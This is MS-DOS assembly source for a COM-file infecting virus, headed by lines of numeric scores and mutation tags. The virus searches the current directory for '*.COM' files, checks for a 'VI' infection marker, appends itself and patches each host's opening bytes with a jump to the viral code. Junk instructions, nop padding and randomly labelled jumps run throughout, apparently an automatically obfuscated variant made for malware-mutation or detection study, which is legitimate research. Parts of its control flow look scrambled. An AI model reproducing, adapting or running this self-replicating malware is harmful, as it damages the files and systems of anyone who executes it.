;1.95715850495
;2.22799507272
;1.70263059447
;1.51753501677
;1.75355053295
;1.49313396828
;NoMutation
;1.68442568382
;NoMutation
;1.44271566984
;1.49825742668
;1.51757430991
;		JZ 	_0
;2.1338222518
;		JNZ 	_1
;1.55897397969
;UntouchBlock_1
;1.83486582702
;1.32768020828
;1.76902224059
;1.64236453465
;1.73849169661
;1.5423168484
;		JNZ 	_1
;1.64658358752
;1.47038995958
;1.58448706959
;1.46428998338
;1.23961640697
;1.22917191311
;1.4667239143
;1.20959111619
;1.28377861924
;NoMutation
;1.32716453349
;1.1067627822
;1.24193993591
;1.17389838771
;1.15731673625
;		JNZ 	_0
;0.985361342431
;UntouchBlock_0
;1.18863340756
;1.01817028009
;ForcedJMP_0
;1.06026825748
;		JNZ 	_0
;1.04306654313
;0.787489955053
;NoMutation
;0.826485278901
;0.573352773621
;		JNZ 	_0
;0.596691408651
;0.749477788219
;0.633208291019
;ForcedJMP_0
;0.621352414494
;NoMutation
;0.679199510718
;		JZ 	_0
;0.638079213063
;0.255120421734
;UntouchBlock_0
;		JZ 	_0
;		JNZ 	_0
MAIN    SEGMENT BYTE
		ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING
		ORG     100H

HOST:
		jmp     NEAR PTR VIRUS_START   
        db      'VI'
        mov     ah,4CH
        mov     al,0
        int     21H              

VIRUS:   		                 
COMFILE DB      '*.COM',0        

VIRUS_START:
RWRYF:
		call 	 XWXHB
HYMGY:
		call 	 EPIUD
        call    GET_START       

GET_START:
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS
        mov     dx,OFFSET DTA   
		cmp 	bx,bx
JNZ XWXHB
JMP RWRYF
XWXHB:
        mov     ah,1AH          
        int     21H        
        call    FIND_FILE       
        jz      N1
        jmp     EXIT_VIRUS      
        N1:
        call    INFECT          
        mov     dx,OFFSET FNAME 
        mov     WORD PTR [HANDLE],24H    
		JMP 	NSTKP
cmp cx,dx
cmp cx,dx
cmp cx,dx
NSTKP:
        mov     ah,9  
		JMP 	HYMGY
EPIUD:
KDRQK:
		call 	 RS_OW
        int     21H             

EXIT_VIRUS:
        mov     dx,80H          
        mov     ah,1AH          
        int     21H             
        mov     bx,[VIR_START]  
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]  
        mov     WORD PTR [HOST],ax 
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]        
        mov     WORD PTR [HOST+2],ax        
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]        
		cmp 	cx,bx
JZ BOEWC
JMP KDXKO
BOEWC:
		cmp 	bx,bx
JZ ARDQH
JMP RNXA_
ARDQH:
        mov     BYTE PTR [HOST+4],al        
        mov     [VIR_START],100H   
		cmp 	dx,bx
JZ RS_OW
JMP KDRQK
RS_OW:
        ret                     

START_CODE:                     
        nop                     
        nop                     
        nop        
        nop        
        nop             
RNXA_:
KDXKO:
		call 	 BOEWC
		call 	 ARDQH



FIND_FILE:
        mov     dx,[VIR_START]
		JMP 	UAWNR
nop
nop
nop
nop
nop
UAWNR:
        mov     cx,3FH          
		cmp 	dx,dx
JZ VQCXU
JMP TNF__
VQCXU:
        mov     ah,4EH          
        int     21H
TNF__:
		call 	 VQCXU


FF_LOOP:
        or      al,al           
		jnz     N2
        jmp     FF_DONE
        N2:         
		call    FILE_OK         
		jnz     N3
        jmp     FF_DONE         
        N3:
		mov     ah,4FH          
		cmp 	ax,dx
JNZ ZFFPW
JMP WJXCK
ZFFPW:
		int     21H             
HWHSD:
		call 	 LWOPP
		jmp     FF_LOOP         

FF_DONE:
BV__U:
		call 	 KBYF_
WJXCK:
		call 	 ZFFPW
        ret


FILE_OK:        
        mov     dx,OFFSET FNAME 
        mov     dx,OFFSET FNAME 
		JMP 	HWHSD
LWOPP:
		cmp 	cx,bx
JNZ KBYF_
JMP BV__U
KBYF_:
        mov     ax,3D02H      
        int     21H        
        jnc     N6
        jmp     FOK_NZEND     
    N6:
        mov     bx,ax         
        push    bx            
        mov     cx,5          
        mov     dx,OFFSET START_IMAGE         
        mov     ah,3FH        
        int     21H        		
        pop     bx            
		JMP 	EOING
nop
nop
nop
nop
nop
nop
nop
nop
EOING:
        mov     ah,3EH        
		cmp 	ax,dx
JZ YFXJH
JMP EEF__
YFXJH:
        int     21H           
        mov     ax,WORD PTR [FSIZE]               
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS 
        jnc     N7
        jmp     FOK_NZEND                         
        N7:
        cmp     BYTE PTR [START_IMAGE],0E9H 
        jz      N4
        jmp FOK_ZEND        
        N4: 
        cmp     WORD PTR [START_IMAGE+3],4956H 
        jz      N5
        jmp     FOK_ZEND           
JYNXM:
		call 	 BLWGN
EEF__:
		call 	 YFXJH
        N5:


FOK_NZEND:
        mov     al,1          
        or      al,al         
        ret

FOK_ZEND:
        xor     al,al         
        ret    
YVBIX:
		call 	 EDKES
GPEOX:
		call 	 DCZFG
EHD_V:
		call 	 PMIEJ
RUKUR:
		call 	 GGYBP
        

INFECT:
        mov     dx,OFFSET FNAME  
		JMP 	JYNXM
BLWGN:
        mov     ax,3D02H        
        int     21H        
        mov     WORD PTR [HANDLE],ax            
        xor     cx,cx                       
        mov     dx,cx               
        mov     bx,WORD PTR [HANDLE]        
		JMP 	EHD_V
PMIEJ:
		cmp 	ax,ax
JZ DCZFG
JMP GPEOX
DCZFG:
        mov     ax,4202H                    
        int     21H        
        mov     cx,OFFSET FINAL - OFFSET VIRUS 
		cmp 	ax,ax
JNZ GGYBP
JMP RUKUR
GGYBP:
        mov     dx,[VIR_START]           
		JMP 	ILQLZ
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ILQLZ:
        mov     bx,WORD PTR [HANDLE]                         
        mov     ah,40H                                      
MOJYP:
        int     21H        
        xor     cx,cx           
        mov     dx,WORD PTR [FSIZE]   
        add     dx,OFFSET START_CODE -  OFFSET VIRUS     
        mov     bx,WORD PTR [HANDLE]                         
        mov     ax,4200H                               
		cmp 	ax,dx
JZ EDKES
JMP YVBIX
EDKES:
        int     21H        
        mov     cx,5                                    
OYHKX:
		JMP 	BEEAZ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
BEEAZ:
        mov     bx,WORD PTR [HANDLE]                    
DJSGT:
        mov     dx,OFFSET START_IMAGE                  
        mov     ah,40H        
DVUTN:
        int     21H        
        xor     cx,cx                                 
        mov     dx,cx                             
        mov     bx,WORD PTR [HANDLE]         
        mov     ax,4200H                          
        int     21H
        mov     bx,[VIR_START]                    
        mov     BYTE PTR [START_IMAGE],0E9H     
        mov     ax,WORD PTR [FSIZE]             
		cmp 	dx,dx
JZ FZNWK
JMP _WLWR
FZNWK:
		JMP 	JROKD
MYPFJ:
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3 
        mov     WORD PTR [START_IMAGE+1],ax        
        mov     WORD PTR [START_IMAGE+3],4956H       
        mov     cx,5   
        mov     dx,OFFSET START_IMAGE      
        mov     bx,WORD PTR [HANDLE]       
        mov     ah,40H                     
        int     21H        
        mov     bx,WORD PTR [HANDLE]       
		JMP 	MYEBN
HADDF:
        mov     ah,3EH                     
        int     21H        
JROKD:
		call 	 MYPFJ
_WLWR:
		call 	 FZNWK
MYEBN:
		call 	 HADDF
        ret                                

FINAL:           
ENDVIRUS        EQU     $ + 212    


       ORG     0FF2AH

DTA             DB      1AH dup (?) 
FSIZE           DW      0,0         
FNAME           DB      13 dup (?)  
HANDLE          DW      0           
START_IMAGE     DB      0,0,0,0,0   
VSTACK          DW      50H dup (?) 
VIR_START       DW      (?)         

MAIN    ENDS

        END     HOST                   